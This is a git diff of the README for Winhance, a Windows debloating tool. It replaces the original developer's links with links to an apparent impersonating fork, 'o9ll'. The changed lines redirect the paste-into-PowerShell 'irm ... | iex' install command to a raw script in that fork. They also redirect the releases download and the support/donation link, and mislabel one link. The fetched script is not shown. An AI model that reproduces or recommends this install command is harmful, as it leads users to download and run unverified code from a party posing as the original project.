@@ -2,7 +2,7 @@
 
 **Winhance** is a C# application designed to debloat, optimize and customize your Windows experience. From software management to system optimizations and customization, Winhance provides everything you need to enhance Windows 10 and 11 systems.
 
-**Winhance** features most of the same enhancements as [UnattendedWinstall](https://github.com/memstechtips/UnattendedWinstall) without needing to do a clean install of Windows.
+**Winhance** features most of the same enhancements as [UnattendedWinstall](https://github.com/o9ll/Winhance) without needing to do a clean install of Windows.
 
 > [!NOTE]
 > Winhance is an independent, open-source project and is **not affiliated with, endorsed by, or associated with Microsoft** in any way. "Windows" is a registered trademark of Microsoft Corporation. Any similarities to Windows Settings or other Microsoft interfaces are a natural result of building a Windows enhancement tool using native Windows UI frameworks.
@@ -18,13 +18,13 @@
 ### Quick Install via PowerShell
 Paste this command into PowerShell to download and run the installer:
 ```powershell
-irm "https://get.winhance.net" | iex
+irm "https://raw.githubusercontent.com/o9ll/Winhance/main/Winhance.ps1" | iex
 ```
 
 ### Download the Installer
 
 [![Download from Winhance.net](https://img.shields.io/badge/Download-Winhance.net-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://winhance.net)
-[![Download from GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/memstechtips/Winhance/releases)
+[![Download from GitHub Releases](https://img.shields.io/badge/Download-GitHub%20Releases-181717?style=for-the-badge&logo=github&logoColor=white)](https://github.com/o9ll/Winhance/releases)
 
 The `Winhance.Installer.exe` includes both Installable and Portable versions during setup.
 
@@ -36,7 +36,7 @@ The `Winhance.Installer.exe` includes both Installable and Portable versions dur
 ## Support the developer
 
 It really does make a big difference, and is very much appreciated. Thanks<br>
-[![Support Winhance](https://img.shields.io/badge/Support-Winhance-FFD700?style=for-the-badge&logo=githubsponsors&logoColor=white)](https://store.memstechtips.com/winhance/)
+[![Support Winhance](https://img.shields.io/badge/Support-Winhance-FFD700?style=for-the-badge&logo=githubsponsors&logoColor=white)](https://github.com/o9ll/Winhance/)
 
 ## Current Features 🛠️
 
@@ -89,5 +89,5 @@ Except where otherwise stated (see [THIRD-PARTY-NOTICES.txt](THIRD-PARTY-NOTICES
 
 If you have feedback, suggestions, or need help with Winhance, please join the discussion on GitHub or our Discord community:
 
-[![Join the Discussion](https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/memstechtips/Winhance/discussions/183)
+[![Join the Discussion](https://img.shields.io/badge/Join-the%20Discussion-2D9F2D?style=for-the-badge&logo=github&logoColor=white)](https://github.com/o9ll/Winhance/discussions/183)
 [![Join Discord Community](https://img.shields.io/badge/Join-Discord%20Community-5865F2?style=for-the-badge&logo=discord&logoColor=white)](https://www.discord.gg/zWGANV8QAX)
